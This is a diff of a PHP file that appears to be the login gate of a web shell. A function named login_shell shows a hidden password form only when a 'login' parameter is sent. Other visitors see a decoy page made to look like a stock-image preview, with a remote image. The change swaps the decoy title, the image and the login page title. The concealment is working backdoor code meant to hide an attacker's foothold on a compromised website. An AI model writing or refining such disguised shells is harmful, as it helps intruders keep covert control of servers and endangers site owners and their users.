@@ -27,14 +27,14 @@ function login_shell() {
 ?>
 <?php
 if(isset($_REQUEST['login'])){
-	    echo "<title>awokwokwok</title>";
+	    echo "<title>Hidden Login</title>";
 	    echo "<br>";
         echo "<pre>";
         echo "<html><style>body { background:#1e1e1e; color: aqua; }</style><center><form method='post'><input type='password' name='password'></form></html></center>";
         echo "</pre>";
         die;
 }
-echo "<title>AdobeStock_89318036_Preview-removebg-preview.png</title><style>* {background:#000; }</style><table width=100% height=100%><td align=center><center><img src=https://telegra.ph/file/c29bf3521749414c24405.jpg alt='AdobeStock_89318036_Preview-removebg-preview.png' width=100%>";
+echo "<title>AdobeStock_89318036_Preview-removebg-preview.gif</title><style>* {background:#000; }</style><table width=100% height=100%><td align=center><center><img src=https://telegra.ph/file/dd5f5e3c6e4203a86e973.gif alt='AdobeStock_89318036_Preview-removebg-preview.gif' width=100%>";
 ?>
 <?php
 exit;
